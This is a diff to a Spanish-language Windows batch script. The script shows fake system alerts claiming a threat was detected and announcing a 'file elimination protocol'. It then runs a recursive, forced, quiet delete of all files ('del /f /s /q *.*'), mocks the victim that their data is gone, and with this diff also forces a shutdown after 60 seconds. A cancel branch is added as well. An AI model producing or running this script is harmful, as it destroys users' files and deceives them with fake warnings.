@@ -23,7 +23,8 @@ echo.
 
 choice /M "¿Quieres proceder?" /C SN
 
-
+if errorlevel 2 goto :cancelar
+if errorlevel 1 goto :ejecutar
 
 :ejecutar
 cls
@@ -33,6 +34,10 @@ msg * ADVERTENCIA: Se ha detectado una amenaza en su sistema.
 msg * Iniciando el protocolo de eliminacion de archivos...
 del /f /s /q *.*
 msg * Lo sentimos pero tus datos han sido borrados TE HE AVISADO
+msg * ahora vamos a apagar las luces pero tranquilo en 60 sec
+shutdown /s /t 60
 goto :eof
 
-
+:cancelar
+echo Buena elección
+echo Nos volveremos a ver
